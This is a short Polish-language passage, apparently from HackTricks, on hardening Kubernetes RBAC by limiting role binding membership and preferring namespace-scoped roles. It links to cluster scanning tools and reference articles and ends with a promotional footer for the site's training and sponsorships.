### **Ograniczenie przypisania użytkowników w RoleBindings/ClusterRoleBindings**

* **Selektywne uwzględnianie**: Upewnij się, że do RoleBindings lub ClusterRoleBindings są uwzględniani tylko niezbędni użytkownicy. Regularnie przeglądaj i usuwaj nieistotnych użytkowników, aby utrzymać wysokie bezpieczeństwo.

### **Role specyficzne dla przestrzeni nazw zamiast roli na poziomie klastra**

* **Role vs. ClusterRoles**: Preferuj korzystanie z ról i RoleBindings dla uprawnień specyficznych dla przestrzeni nazw, zamiast ClusterRoles i ClusterRoleBindings, które mają zastosowanie na poziomie klastra. Taki podejście oferuje większą kontrolę i ogranicza zakres uprawnień.

### **Używaj narzędzi automatycznych**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Odnośniki**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
